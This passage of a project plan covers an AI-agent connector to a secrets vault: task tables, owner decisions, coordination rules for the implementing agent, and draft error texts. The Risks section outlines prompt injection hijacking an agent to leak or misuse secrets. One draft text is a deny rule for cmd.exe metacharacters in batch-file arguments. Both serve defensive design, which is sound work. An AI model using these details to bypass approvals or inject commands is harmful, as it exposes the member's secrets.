uninstall leave nothing behind (listed in the README); a run or proxy tool in a connector with no service installed answers `separate_account_required`, and a stub whose channel is missing answers any tool with the "No service" text (A3.10a's split) (0.1.17, fix round) The user names are the hash forms; a colliding hash is refused; a `\` in a `cwd`, input or output path is refused by the connector on POSIX with a plain notice. |

### A6 — Staging with the Android app (after AA1–AA5, §7.2)

*Status: not started; it waits for AA1 to AA5 in the Android app.*

Checklist in `docs/STAGING-CHECKLIST.md` in vettid-agent, run with a
**staging test account** on the Android staging app on a test phone:
pair by copying the code, compare the SAS, approve with a session;
share items with the agent by an agent share rule (its only grant in
A6, ANDROID-PLAN 0.1.53 decisions 2 and 3), made with the password;
use an item shared with the agent (ask, then auto: the auto step once
AV9 is in a staging release, ANDROID-PLAN decision 17); approve and
deny referred requests in Approvals; see the agent's activity in History
(`agents`); end the session, revoke, resume after a suspension, unlink.
**Exit A6** is the owner running the checklist in person.

### What blocks what

| Phase | Blocked by |
|---|---|
| A0, A1 | AG0–AG3 answered |
| A2.2 (without the owning-goroutine workaround) | AV1, AV2 (§7.1); not blocking: the workaround of §3.2 |
| A2.4, A3.4 | a dev stack that runs on the implementing machine (memory, §9 rule 8) |
| A4 | AG5's v1.1 confirmed |
| A1.5's manual round trip | the signed app bundle of A5 (the owner's App ID and Developer ID provisioning profile, §8 item 3) |
| A3.5 | AV7 in a staging release |
| A3.7, A3.8a, A3.8b, A3.9 | AV9 (and AV10 for A3.8a and A3.8b, AV11 for A3.9) in a staging release; AA7 and AA8 for the staging checklist (A6) |
| A5.2, A5.3 (macOS) | the owner's YubiKey keys and Apple Developer ID (§8 items 2–3) |
| A5.4 | A5.3; the owner's Developer ID Installer certificate (§8 item 3); AGENT-SEPARATE-ACCOUNT approved (vettid.org #539). macOS runs and proxies (A3.8a, A3.8b, A3.9 on macOS) wait for it (the owner's Q4 c) |
| A3.10a | AG14 (decided); test accounts on a Windows machine (§4.8). Nothing else |
| A3.10b | A3.10a (the check of the connector's account and of starting a run without a privilege that reaches SYSTEM is done, vettid/vettid-agent#53, 0.1.19; route B, GC #15936) |
| A3.10c | A3.10b |
| A5.5 | A3.10c (and A3.10b); a Windows test machine where the agent may add accounts and services |
| A3.8b, A3.9 (0.1.16) | A5.5 (owner edits #1002, #1003 applied 2026-11-21), on top of the rows above. In the separate-account mode only (AG14): Windows after A3.10a to A3.10c and A5.5, Linux after A5.6, macOS after A5.4 and the row below (the owner's Q4 c) |
| AV12 (0.1.17) | VAULT-MESSAGING 0.93.0 approved and merged; AV9 and AV10 (built). A vault release with 0.93.0, whose catalog carries `folders`, before any connector sends `cwd` (for a member folder), `inputs` or `output` |
| A5.5a (0.1.17) | A5.5 |
| A3.10d (0.1.17) | A3.10c, AV12 (no share is needed for files) |
| A3.10e (0.1.17) | A3.10c, AV12; a VAULT-MESSAGING change for the profiles' wire, not yet specified |
| AA9 (0.1.17) | AV12 in a staging release; AA7 and AA8 |
| A5.6 | A3.10a (the channel); A5.5 first in order (Windows first); the run helper's and the key sealing's independent reviews; the owner's answer on a machine without a TPM 2.0 (c, GC #15786). Gates Linux runs and proxies only |
| macOS runs and proxies (A3.8b, A3.9 on macOS; 0.1.16) | A5.4, plus A5.6's Unix socket end and run-helper design and the macOS pieces not yet carded (AG14), on top of A3.10a |
| A5.3 (Windows) | the business entity and its Authenticode certificate (§8 item 4) |
| A6 | Android AA1–AA5 on staging (§7.2), ANDROID-PLAN's "Devices & agents" approved; its "auto" step: AV9 in a staging release (ANDROID-PLAN 0.1.53 decision 17) |
| Production | a production release whose channel lists `leash` (§11.10.8, STAGING-DEVELOPMENT-PLAN §2.4) and the Android work in a production app |

## 7. Work outside vettid-agent

### 7.1 vettid-vault (reference client and dev stack; AV6–AV8 in the enclave)

Each its own small vettid-vault PR, by an agent working in that
repository. AV1–AV5 do not change the enclave or need a release; AV6,
AV7 and AV8 change the enclave and ship in a staging release.

| # | Task | Spec | Why | Blocks |
|---|---|---|---|---|
| AV1 | **Save before acknowledging**: a `Config.Persist func(state []byte) error` called after a collected batch is handled and before its acks (an error leaves the batch unacknowledged, to be collected again) (0.1.9) **Built:** vettid-vault #111 and #112 (merged 2026-10-18). (0.1.13) **Follow-up built:** vettid-vault #283 (merged 2026-11-20), `Config.PersistBatch func(state []byte, batch []*envelope.Inner) error`, used instead of `Persist` when set: the same contract, and also given the responses and events handled and not yet saved, oldest first (again after a failed save). Under `Persist` the connector saw a batch's events only after the ack, so state it derives from them (grant sets, `device.session.granted` and `.ended`, `device.unlinked`) could be lost by a crash in between; vettid-agent #46 saves through it. | §8.3 (the vault's rule; the same reasoning for a device) | `client.Poll` acks each message right after handling it; a crash before the caller's `Save` loses a rekey, a token or `device.paired` that the relay will not deliver again | — (workaround in A2.2) |
| AV2 | **One collecting loop**: `(*Device).Run(ctx)` collects (long poll or WebSocket) and dispatches; `Request`, `Op`, `WaitEvent` and `LeashPresent` wait on it when it runs, instead of collecting themselves (0.1.9) **Built:** vettid-vault #114 (merged 2026-10-18). | §8.1 | Concurrent tool calls in a daemon each collect today, and whichever collects first consumes the others' messages into the shared buffer | — (workaround in A2.2) |
| AV3 | **Approvals and retries**: `AwaitResponse` extends its wait to `approval.waiting`'s `exp` for its request and exposes the `approval_id`; an optional application retry reusing the inner id, at most twice | §6.8 step 1, §8.1, §8.6 | Today a referred request times out on the caller's deadline and is never retransmitted | — |
| AV4 | **Wallet out of the import graph**: move `client/wallet.go` (and its `vms/btc` use) to `client/wallet` (0.1.9) **Built:** vettid-vault #110 (merged 2026-10-18). | — | Importers of `client` compile btcsuite and decred secp256k1 for nothing | — |
| AV5 | **Dev stack for a non-phone app**: document (README "Local dev stack") how `vaultctl` enrolls a second test vault, creates and unlocks its credential and pairs an agent with grants; add a control endpoint only if a step cannot be done with `vaultctl` (0.1.9) **Built:** vettid-vault #116 (merged 2026-10-18). | §6.7, §10.11 | The connector's integration tests need a member's app that can sign grants; the dev stack's peer has no credential | A2.4 |
| AV6 | **The bound on access-session prompts** (VAULT-MESSAGING 0.40.0, §7.3 Q3): a `device.session.request` within 10 minutes of the device's last accepted one is answered `too_soon` (`{allowed_after}`), notifies no app and records no feed item, and does not replace a pending request; tests for each case. An enclave change: in the next staging release (0.1.9) **Built:** vettid-vault #109 (merged 2026-10-17); it ships in the staging releases from S17 on (S16 was not published). | §6.8, §10.3 | `hSessionRequest` (`vault/access.go`) notifies the apps and records a high-priority feed item for every request; only "newest replaces older" bounded them | — |
| AV7 | **Grant-set sequence numbers** (VAULT-MESSAGING 0.41.0 §10.11). (0.1.13) **Built:** vettid-vault #210, with follow-ups #211 and #212 (merged 2026-11-10). One counter in the vault's sealed state; every change to an agent's grant set (a grant issued, replaced or revoked, a share rule of the agent set or deleted, a grant revoked with its connection, suspension, resumption, the set a pairing completes with) takes its next value; `leash.grant.updated` and the agent's `leash.grant.list` answer carry it as `grant_seq`; never reset, never reused; tests for each change and for a re-paired agent | §10.11, §8.4 | Without it, a `leash.grant.list` answer sent before a revocation can arrive after it and bring the grant back | A3.5 |
| AV8 | **The device's own session in `vault.status`** (VAULT-MESSAGING 0.41.0 §10.2). (0.1.13) **Built:** vettid-vault #183 (merged 2026-11-02, VAULT-MESSAGING 0.82.5). `vault.status` to a desktop or agent also returns `session: {session_id, expires_at}` for the caller's own current access session, or `null`; never another device's | §10.2, §6.8 | An agent has no message that returns its own session; the connector probes with `leash.grant.list` (§4.3 step 4) | — |
| AV9 | **Ways to use a secret: settings, catalog, reveal off** (VAULT-MESSAGING 0.42.0 §10.11). (0.1.13) **Built:** vettid-vault #270 to #272 (merged 2026-11-19), with #278 (2026-11-20: a reveal's answer cached without its values), not yet in a staging release. `leash.item.set` and `.list`, the settings per agent and item, the unlock window to widen, deletion when the item is no longer included, `sync.event{leash.item.changed}`; `ways`, `programs` and `hosts` in `catalog`; `item.get` only with `reveal` (`way_not_allowed`, counted as refused) and always referred; `approval.pending{flags}`; every existing agent item starts with `["use"]`. (0.1.10, VAULT-MESSAGING 0.85.3) `programs` entries are `{program, sha256?, path?, env}`, no two matching one path: the pin (`sha256` and `path`) recorded by the vault, never the app, when the member approves a run flagged `program_unrecorded` or `program_changed`, and kept or dropped (never set) by `leash.item.set`; `env` names checked by the name rule, adding one widens; the catalog's entries with the pinned `path`, never the hash | §10.11, §10.12, §6.8 | `item.get` hands every included item's value to the agent's app, which may keep it in its history | A3.7 |
| AV10 | **`item.run`** (§10.11). (0.1.13) **Built:** vettid-vault #273 to #275 (merged 2026-11-19), with #278 to #280 (2026-11-20: the answer cached without the value, launchers and evaluators flagged `shell`, no `~` in a program's last element), not yet in a staging release. Checks of `program`, `argv`, `cwd`, `how`, `name` and `env`; `programs` binding (`program_not_allowed`); referral when `each`, unbound, or a shell or interpreter; `flags` (`shell`, `inline_code`, `unbound_program`); (0.1.10, VAULT-MESSAGING 0.85.3) `sha256` checked against the matched entry, a missing pin, or a different hash or path, referred with `program_unrecorded` or `program_changed` (with `previous_sha256` and `previous_path`) and recorded on approval; a run whose settings changed while it waited decided again; `env` names only from the matched entry's `env`, none for an unbound item (`env_not_allowed`, counted as refused); the code-loading names refused; the windows and `uses` counted; `leash.item.run` audited and in the feed. Tests for each refusal, each flag and each referral case | §10.11 | The second way needs the value released to the connector for one approved command | A3.8a, A3.8b |
| AV11 | **`item.proxy`** (§10.11). (0.1.13) **Built:** vettid-vault #276 (merged 2026-11-19), with #278 (the answer cached without the value), not yet in a staging release; as built in VAULT-MESSAGING 0.91.1. Always referred; `host` among the item's `hosts`; `seconds` bounded by 3,600 and the access session; a value that is not header-safe refused; `leash.item.proxy` audited and in the feed; tests for each | §10.11 | The third way needs the value released to the connector for one host and a bounded time | A3.9 |
| AV12 | **Member folders and files in and out** | VAULT-MESSAGING 0.93.0 §10.11 (card #15811, GC #15810) | Not built. `folders` in a run binding (`leash.item.set`, `leash.item.list`, the catalog), `cwd` optional in `item.run`, `cwd_not_allowed`, `inputs` and `output`, the `member_folder` and `member_files` flags and the `folders` member of `approval.pending`; tests as the section lists them. The catalog's `folders` (empty when none) is the signal that a vault is 0.93.0 or later; no capability name is added (S10) | A3.10d, A5.5a's use of folders, AA9 |

### 7.2 vettid-android (ANDROID-PLAN "Devices & agents", owner approval)

ANDROID-PLAN lists Devices & agents as a later drawer entry and a later
phase (§4 "Drawer", §6 "Calls, devices/agents/LEASH, … follow v1").
Before any of this is built, ANDROID-PLAN needs a "Devices & agents"
section with screens and texts, approved by the owner (§7.4). The
connector's staging phase A6 needs AA1–AA5. (0.1.7) Specified in
ANDROID-PLAN 0.1.53 §4 "Devices & agents", approved by the owner
(2026-10-20); its decision 14 lists the VAULT-MESSAGING gaps it found
(no list of pending pairings, access requests and approvals; no
`device_id` in `device.pair.approve`'s answer; unnamed codes for ended
ones).

| # | Work | Spec | Today |
|---|---|---|---|
| AA1 | **Devices & agents screen**: `device.list` (name, role, last active, access session and its end), unlink (`device.unlink`, with a confirmation), end an access session (`device.session.end{device_id}`) | §10.3, §6.8 | none |
| AA2 | **Pair an agent**: `device.pair.create{role: "agent"}`, the QR and the code with Copy and Share (the code expires in 10 minutes), `device.pair.pending` → the SAS comparison screen ("Does the agent show 123 456?"), reject (`device.pair.reject`), approve with a first access session length (`session_seconds`); (0.1.7) no initial grants (ANDROID-PLAN 0.1.53 decision 2: an agent's reading permissions are share rules, AA4, made right after; `device.pair.approve{grants}` refuses `items.read`, and owner-type grants wait for A4), so the approval needs no unlock window | §6.7, §10.3, §10.11 | QR kinds parsed only |
| AA3 | **An agent's permissions**: list (`leash.grant.list{agent_id}`), add or change (`leash.grant.issue`, within the unlock window: scope, Ask me each time / Allow automatically, connections, per hour / per day for `auto`, ends, status lifetime), revoke (`leash.grant.revoke`), resume after a suspension (`leash.agent.resume`); `sync.event` `leash.grant.changed`, `.revoked`, `leash.agent.suspended` | §10.11 | none |
| AA4 | **Agent share rules** (`items.read`): the share-rule editor with an agent as subject, including `per_hour` and `per_day` (agent rules only, ANDROID-PLAN §4 rule editor note; VAULT-MESSAGING 0.23.0) | §10.12, §10.11 | model only (`ShareSubject.agentId`) |
| AA5 | **Approvals for agents**: approve (not only decline) `device.session.pending` with a changeable length, and `approval.pending` for an agent's `agent.request` (say which item, "read" or "use", and which agent) and for delegable owner types; replace "This version of the app does not pair desktops or agents, so it can only decline." | §6.8, §10.3 | decline only |
| AA6 | **Feed and History**: details for `leash.*` (`leash.rate_limited`, `leash.referrals_limited`, `leash.agent.suspended`, `leash.item.read`, `leash.item.used`, summaries), which today open "Not available in this version of the app" (ANDROID-PLAN §4 feed table); the `agents` History category | §10.9, §10.11 | texts only |
| AA7 | **How an agent may use an item** (AG13): per agent and included item, the ways (use always; run, proxy, "May be shown to agents", all off by default), the allowed programs and "Ask me before each run", (0.1.10) for each program the variables it may receive (none by default, adding one is a widening) and whether its fingerprint is recorded, with a way to forget it, the API hosts and the header (name and prefix); widening asks for the password (unlock window); `leash.item.set`, `.list`, `sync.event{leash.item.changed}`. Not started. Acceptance: each setting round-trips; widening without the unlock window asks for the password; narrowing does not; the reveal switch shows the history warning before it turns on | §10.11 | none |
| AA8 | **Approvals for the new ways** (AG13): `approval.pending` for `item.run` (program, every argument unabridged, directory, how the secret is passed, extra variables, the `shell`, `inline_code` and `unbound_program` warnings; (0.1.10) the program's fingerprint, and for `program_unrecorded` that approving lets later runs of this exact file follow the item's settings, for `program_changed` the old fingerprint and path beside the new and that the program changed or moved), `item.proxy` (host, header name and prefix, (0.1.14) these three from `approval.pending`'s `proxy` member, never the app's own copy of the settings, and Deny only when it is missing; the length from the body's `seconds`, which the vault may cut to the access session's end) and `item.get` (the history warning). Not started. Acceptance: screenshots for each kind and flag in the PR; a long or non-printable argument is shown in full, escaped, never cut | §6.8, §10.11 | none |
| AA9 | **Member folders and files on a run** (0.1.17, Q1 a, Q9 a; ANDROID-PLAN 0.1.135; card #15812 Android, #15813 iOS): in AA7's run settings, "Folders this program may use", each folder read-only first with a switch for write; and in AA8's run approval, the folder with "read only" or "can change files", the input files and the output folder with the names to copy back. Not built; needs AV12 | ANDROID-PLAN §4 "Devices & agents", IOS-PLAN | Not started |

IOS-PLAN places devices and agents in its "Later" list, following
Android; nothing here blocks on iOS.

### 7.3 Spec questions (answered by the owner, 2026-10-17)

| # | Question | Where | Answer |
|---|---|---|---|
| Q1 | LEASH §3.4 says the connector "MUST report a cryptographic hash of its binary to the vault during enrollment and periodically thereafter", while VAULT-MESSAGING §10.11 puts binary attestation "out of the vault's scope", so no message carries it | LEASH §3.4; §10.11 | **Recorded as a known difference** in LEASH-IMPLEMENTATION ("Platform binding and binary attestation"): a self-reported hash proves little without hardware attestation. Revisited with reproducible, signed builds (A5) |
| Q2 | The proof of possession a relying party asks for (§10.11 verification step 6) has no defined format, and LEASH §3.3 leaves the MCP carriage "to be specified" | §10.11; LEASH §3.3 | **Waits**: presentation to other tool servers stays out of v1 (AG5) |
| Q3 | Nothing bounded how often a paired desktop or agent may send `device.session.request`; each one is a high-priority prompt on the member's phone | §6.8 | **VAULT-MESSAGING 0.40.0**: at most one accepted request per device every 10 minutes, others answered `too_soon` with `allowed_after` and shown to no app; built in AV6. The connector keeps AG8's own bound and treats `too_soon` as "ask again after `allowed_after`" |
| Q4 | A device offline longer than its standing token and the relay's message retention cannot deposit to its vault again | §7.1, §7.2 | **VAULT-MESSAGING 0.40.0 §7.2**: re-pairing is the way back (§4.6) |
| Q5 | §6.7 said an agent "learns [its initial grants] in `leash.grant.updated`", which the vault sends only within an access session (§10.11) | §6.7, §10.11 | **VAULT-MESSAGING 0.40.0 §6.7**: the agent fetches its grants with `leash.grant.list` whenever a session starts (as §4.5 does) |

### 7.4 vettid.org (owner approval)

- ANDROID-PLAN: the "Devices & agents" section of §7.2 (screens, texts,
  the History details), as its own version. (0.1.7) AA1–AA5 in
  ANDROID-PLAN 0.1.53, approved by the owner (2026-10-20); the History
  details (AA6) and
  the ways to use a secret (AA7, AA8) follow.
- STAGING-DEVELOPMENT-PLAN §5 row 3: record AG0 and this plan.
- LEASH-IMPLEMENTATION "Connector": rewritten when A3 is on staging (an
  MCP server; the platform binding of AG3; Q1's deviation).
- PQC-MIGRATION §4 row 5: name the connector's release signing as the
  first user of the release root (AG4).
- A page for the connector's downloads and signature verification, with
  the release public key, when A5 ships (the site's logs and their
  readers are unchanged).
- The spec questions of §7.3.

## 8. Owner prerequisites

1. **Decisions**: all of §2 decided or accepted (2026-10-17); the §7.3 questions answered (2026-10-17).
2. **Release signing key** (AG4): generated and held offline by the
   owner on a YubiKey (owner decision, 2026-10-18; the tag-signing key
   too); its public key in vettid-agent's `allowed_signers` and published
   on vettid.org. The implementing agent never creates, reads or asks
   for signing material.
3. **Apple**: a Developer ID Application certificate in the owner's team
   for the connector and (0.1.11, A5.4) the run helper, a **Developer ID
   Installer** certificate for the installer package, an App ID and a Developer ID provisioning profile
   that authorizes its `keychain-access-groups` entitlement (§4.2), and
   notarization credentials (a `notarytool` keychain profile), used on
   the owner's Mac (A5.3). The owner's individual Developer account;
   the team ID is passed to `scripts/sign-release`, not stored in CI.
4. **Windows**: an Authenticode code-signing certificate whose key is on
   a hardware token the owner holds (A5.3), once the business entity
   exists (owner decision, 2026-10-18).
5. **Staging**: a staging test account and the Android staging app on a
   test phone (A6); real member data is never used.
6. **GitHub**: the phase issues; branch protection on `main` with the
   three CI jobs required.

## 9. Coordination rules

1. **Scope.** The implementing agent works in `vettid-agent`. It reads
   vettid-vault, vettid-relay, vettid-android and vettid.org; it never
   pushes, comments or opens PRs there, except issues on vettid.org
   (rule 4) and the vettid-vault PRs of §7.1 when the owner assigns them.
2. **Small PRs**, one per row of §6, each with its tests passing locally
   before it is pushed; titles name the row (`A2.1: pairing`). The owner
   merges; the agent never merges.
3. **Public text** (commits, PRs, issues, code comments, this plan)
   never mentions reviews, finding ids, private
   files, local paths outside the repository, or device serials. It
   cites specifications by document and section.
4. **Spec questions go to the owner** as a vettid.org issue (title
   starting `AGENT-PLAN:`), never as an edit to a specification. Where
   the spec is silent, the agent chooses, marks it "(chosen; not in the
   spec)" in the PR, and asks.
5. **No secrets in the repository**: no keys, tokens, pairing codes,
   state files, passphrases or member data; test keys only from fixed,
   public test seeds; gitleaks in CI.
6. **Independent review before merge** for behaviour-changing fixes on
   the lock, unlock, erase and recovery paths, which here are: the state
   store and protectors (A1), wiping on `device.unlinked` and `forget`
   (AG12), pairing (A2.1) and the save-before-ack rule (A2.2). The owner
   arranges it; such fixes fail secure, retry where safe, and tell the
   operator plainly.
7. **Vectors** are stop-and-report items; never edited or skipped.
8. **Machine load**: one heavy command at a time; `go test -p 1` for
   integration packages and `-p 2` at most otherwise; one dev stack at a
   time, torn down when done; no parallel test runs from several agents
   on one machine.
9. **Commit trailers and PR bodies**: as the harness provides them; no
   other attribution.

## 10. Risks

1. **Prompt injection reads secrets into an agent's context.** Pattern 1
   (`item.get`) hands the value to the agent by design, and its app may
   keep it in its history. Mitigation: AG13: reveal off for each item
   until the member turns it on, three ways that keep the value from the
   agent, sent once when revealed; `ask` defaults, per-item inclusion,
   rate limits and suspension in the vault; tool texts give AG13's order;
   values never cached. A hijacked agent can still misuse a run (the
   command it asks for) or a proxy (the API calls it makes): the phone
   shows the command and the host, and items can bind programs (§4.9).
2. **Dependency on vettid-vault's code.** A change in the client or the
   wire packages lands in the connector at the next pin update.
   Mitigation: pinned commits, vectors (§5), update PRs with the
   dev-stack tests.
3. **Weak binding in headless mode.** The passphrase protector is not
   machine-bound (§4.2). Mitigation: said in `status` and the docs;
   TPM where present.
4. **Malware running as the operator.** It could read the state file
   with the operator's rights (where no hardware protector binds it) or
   start the connector itself. Mitigation: no listener of any kind, so
   only a process that starts the connector reaches its tools; the TPM,
   Keychain or DPAPI protector; and the vault, not the connector,
   enforces grants, limits and approvals.
5. **Vault locked or held.** Agents stall; status statements lapse
   (fail closed, as designed). Mitigation: clear tool errors (§11).
6. **Long-offline connectors** need re-pairing (§4.6, Q4).
7. **Unsigned or unknown binaries blocked** on Windows (Smart App
   Control) and macOS (Gatekeeper). Mitigation: AG4 signing before
   those platforms are offered.
8. **MCP churn.** Transports and client behaviour change. Mitigation:
   the MCP layer is one package with golden files.
9. **Member attention.** Session requests and referrals are prompts on
   the phone. Mitigation: the vault's referral cap and its bound on session prompts (Q3, AV6); AG8's bound.

## 11. Draft texts

Connector (terminal and MCP tool errors):

- **Pairing, start**: "Paste the pairing code from Devices & agents on
  your phone. It expires 10 minutes after the phone showed it."
- **SAS**: "Check that your phone shows the same code: 123 456. Approve
  on your phone only if it matches."
- **Waiting**: "Waiting for you to approve on your phone…"
- **Paired**: "Paired with your vault. Your phone decides what this
  agent may do."
- **Rejected** (§6.7): "Rejected on your phone."
- **Expired**: "The pairing timed out. Start again from your phone."
- **Access requested** (AG8): "This agent needs access to your vault.
  Allow it on your phone, then try again."
- **Access denied**: "Access was declined on your phone."
- **Waiting for approval** (AG9): "Waiting for your approval on your
  phone. Check again with leash.check_status."
- **Approval window passed** (AG9; `pending` with
  `waiting_for_approval` false): "The time to approve this request on
  your phone has passed; waiting for your vault's final answer. Check
  again with leash.check_status."
- **Superseded** (`superseded`): "Another copy of this request took its
  place, so its answer cannot be returned here. Make the request again
  if you still need it."
- **Denied** (`denied`): "Declined on your phone."
- **Not allowed** (`forbidden`): "Your vault does not allow this agent
  to do that. You can change its permissions on your phone."
- **Vault locked or unreachable**: "Your vault did not answer. It may be
  locked; unlock it on your phone."
- **Daily check** (`owner_check_required`): "Your vault is waiting for
  your daily check. Open VettID on your phone."
- **Suspended**: "Your vault paused this agent after repeated refused
  requests. You can resume it on your phone."
- **Unlinked** (AG12): "This agent was removed from your vault. Its
  keys have been deleted from this computer."
- **Refused by the relay** (AG12): "Your vault's relay refused this
  agent. If you removed it on your phone, run `vettid-agent forget`."
- **Not machine-bound** (`status`, passphrase protector): "Keys are
  protected by your passphrase only, not bound to this computer."
- **Access ended** (AG8; `access_denied` during the quiet period after a
  session the member ended): "Access was ended on your phone. No new
  request is sent before 15:04." (the time as the code writes it,
  `15:04` in local time)
- **Bound to this computer** (`pair`): "Keys are bound to this
  computer: <reason>.", for DPAPI "Keys are bound to this computer:
  Windows DPAPI, for this Windows user."
- **Domain account** (`pair` with DPAPI, `status`): "This Windows
  account is a domain account: your organization can recover keys
  protected for it."
- **Roaming profile** (`pair` with DPAPI, `status`): "This Windows
  account has a roaming profile: keys protected for it also open on the
  other computers where your profile is loaded."

Ways to use a secret (AG13; new drafts):

- **README note** (A3.6, done in vettid-agent #36, as merged):
  "**Shared values may stay on disk.** `leash.request_secret` hands an
  item's values to the agent's app. Many apps keep tool results in
  their chat history or logs on disk, so a value may stay there after
  the task. The connector wipes only its own copies. Share with an
  agent only the items you accept being stored that way. Safer ways for
  an agent to use a secret are planned."
- **Way not allowed** (`way_not_allowed`): "Your vault does not allow
  this agent to use that item this way. It allows: <ways>. You can
  change this on your phone."
- **Program not allowed** (`program_not_allowed`): "This item may be
  used only with the programs you allowed on your phone."
- **Program not found** (`program_not_found`): "The program was not
  found or cannot be run. Give an absolute path, or a name found in the
  connector's search path."
- **Run failed** (`run_failed`): "The program could not be started."
- **Too many proxies** (`proxy_limit`): "Too many proxies are open.
  Close one with leash.close_proxy and try again."
- **No such proxy** (`proxy_not_found`): "No proxy with that address is
  open. It may have ended; open a new one with leash.open_proxy."

Erratum of 2026-11-05 (0.1.10): connector texts for the owner's
approval, each marked NEW except where the owner already chose it:

- **Old vault** (`vault_too_old`; owner decision of 2026-11-05, option
  a, as chosen): "Your vault is too old for this connector. Update your
  vault, then try again."
- **Variables not allowed** (`env_not_allowed`), NEW: "Your vault does
  not let this program receive these variables: <names>. You can allow
  them for this program on your phone."
- **Batch file argument** (`argument_not_allowed`, 0.1.15, replacing
  "Batch file"; as in vettid-agent #51), NEW, followed by a detail in
  parentheses that names the part and the kind of character or its code
  point, never an argument's value (for example "(argument 2 holds
  &)"): "This program is a Windows batch file (.cmd or .bat), which
  runs through cmd.exe. Its arguments and the environment variables the
  request sets can't hold any of % & | < > ^ ( ) ! " or a control
  character, or any character outside ASCII, and can't end in a
  backslash. Its path, its working folder and the folders from your
  account it is given (such as APPDATA) can't hold those ASCII
  characters or a control character, and none of the folders it gets,
  the PATH it searches included, can hold a character this system turns
  into one of them or into a slash, backslash or colon (such as a
  full-width quotation mark). A variable can't be named as one cmd.exe
  sets itself, such as CD or ERRORLEVEL. Pass a value in a file
  instead, or move the program to another folder."
- **Secret not for a batch file** (`argument_not_allowed`, 0.1.15),
  NEW: "This program is a Windows batch file (.cmd or .bat), and the
  secret's value can't be given to it in an environment variable:
  cmd.exe would read some of its characters as commands. Give it to
  this program as a file (how: file) instead."
- **Answer lost** (`withheld`, 0.1.15, vettid-agent #48), NEW: "Your
  vault handled this request, but its answer with the value was lost
  on the way, and asking again went the same way. Make the request
  again."
- **Program moved** (`program_not_found`, the path changed before the
  start), NEW: "The program changed while it was being started, so it
  was not run. Try again."
- **Not a plain local path** (`program_not_found`), NEW: "The program's
  path goes through a link, a network share, a removable drive or a
  file stream, so it cannot be run with a secret. Give the program's
  own path on a local drive."
- **Not a program** (`program_not_found`: not a regular file, or on
  Windows an extension other than .exe, .com, .cmd or .bat), NEW: "This
  is not a program that can be run with a secret. Give the path of a
  program file (on Windows, an .exe, .com, .cmd or .bat file)."
- **Script** (`program_not_found`), NEW: "This program is a script, so
  it cannot be run with a secret directly. Run its interpreter with the
  script as an argument instead."
- **Two programs running** (`rate_limited_local`, a third run), NEW:
  "Two programs are already running with secrets. Wait for one to
  finish, then try again." (0.1.16: not used while a slot is out of use;
  see "A run slot out of use".)
- **Changeable program, separate-account mode** (`program_not_found`,
  0.1.16, GC #15787), NEW: "This program, or a folder it is in, can be
  changed by an account other than an administrator's, so it can't be
  run with a secret here, even approved. Install it where only an
  administrator can change it."
- **Changeable program, no pin yet** (`program_not_found`), NEW: "This
  program, or a folder it is in, can be changed by the user this
  connector runs as, and your phone has not approved it yet. Install
  it where only an administrator can change it, or approve it once
  from such a place."
- **Approval screens** (the Android app, AA8; drafts for ANDROID-PLAN),
  NEW:
  - `program_unrecorded`: "First run of this program with this item.
    Fingerprint: <fp>. If you approve, later runs of this exact file
    may run without asking, as this item's settings allow."
  - `program_changed`, same path: "This program has changed since you
    approved it. Before: <old fp>. Now: <fp>. If you did not update
    it, deny."
  - `program_changed`, another path: "This program moved to <path>. It
    was approved at <old path>. Before: <old fp>. Now: <fp>. If you did
    not move or update it, deny."
- **Memory file refused** (`run_failed`, Linux), NEW: "This computer does
  not allow the connector to run the program from its sealed copy, so
  it was not run."
- **File in use** (`program_not_found`, Windows: open for writing
  elsewhere), NEW: "The program is being changed by another program,
  so it was not run. Try again when it is finished."
- **Copy failed** (`run_failed`, macOS: the private copy could not be
  made or started), NEW: "The program could not be copied to run it
  safely, so it was not run."
- **`--run-path`, bad value** (startup), NEW: "--run-path <dir>: give
  an absolute path to an existing directory."
- **`--run-path`, too many** (startup), NEW: "--run-path: at most 16
  directories."
- **`--run-path`, changeable** (startup; owner decision of 2026-11-05,
  option a), NEW: "--run-path <dir>: this folder, or a folder above
  it, can be changed by the user this connector runs as. Use a folder
  only an administrator can change."
- **`--run-path`, a link** (startup), NEW: "--run-path <dir>: this
  folder is a link, junction or other reparse point (a OneDrive folder,
  for example). Use a plain local folder."
- **Separate account required** (`separate_account_required`, 0.1.16, AG14), NEW. Where the mode exists (Windows after A5.5, Linux after A5.6, macOS after A5.4): "Running programs and opening proxies with a secret need the connector installed in its own account. Ask your administrator to run `vettid-agent install`, then try again." Elsewhere: "Running programs and opening proxies with a secret are not available on this system yet."
- **Working folder not allowed or not shared** (`cwd_not_allowed` with `where: cwd`, 0.1.17, GC #15810; the vault's code, and the connector's for a folder not shared on this computer or outside the approved entry), NEW: "That folder is not shared with the connector for this item. Share it on your phone and with `vettid-agent share`." (AGENT-SEPARATE-ACCOUNT §8).
- **Input or output not allowed** (`cwd_not_allowed` with `where: input` or `output`, 0.1.17), NEW, with no mention of `share`: "That file or folder is not in the folders you allowed for this item. Add its folder on your phone (with changes allowed for a folder to save files into), then try again."
- **Read-only folder, share writable** (`cwd_not_allowed` with `where: cwd`, from the service, 0.1.17, GC #15855), NEW, naming the folder and both ways out, never a value: "<folder> is read only for this item, but it is shared with write access on this computer. Ask your administrator to share it read only (`vettid-agent share --name <n> <folder>`, without `--write`), or allow changes to it for this item on your phone."
- **Old vault, folders and files** (`vault_too_old` for a run with `inputs`, `output` or a `cwd` outside `work/` against an item whose catalog entry has no `folders`, 0.1.17), NEW: "Your vault's software can't run programs in your folders or hand files in and out yet. Update your vault, or run without a folder."
- **README, folders** (0.1.17, GC #15855), NEW, added to the README's section on running commands: "A program run for an item can reach every folder that is shared with this computer's pairing, not only the folders listed for that item. The item's list decides where a run may start and where files are copied. Share only folders you are willing for every item of this pairing to reach. On Windows, install with a standard account, not an administrator: the installer refuses when UAC is off or the account is the built-in Administrator, and warns when the account is in Administrators."
